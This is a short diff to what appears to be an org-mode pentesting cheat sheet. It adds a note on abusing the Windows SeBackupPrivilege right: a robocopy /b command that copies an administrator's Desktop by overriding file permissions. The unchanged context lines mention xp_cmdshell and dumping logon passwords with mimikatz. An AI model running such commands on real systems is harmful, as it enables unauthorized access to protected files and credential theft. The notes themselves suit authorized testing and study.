@@ -902,6 +902,13 @@ EXEC xp_cmdshell 'whoami';
 
    ---------------
 
+   ---------------
+   Exploit ~SeBackupPrivilege~
+   Use robocopy
+   #+begin_example
+   robocopy /b C:\Windows\veryimportantadminuser\Desktop\ .\adminsDesktop   - do not forget the /b mode to override file and folder permissions
+   #+end_example
+
    Dumping logon passwords with mimikatz
     
    #+begin_example
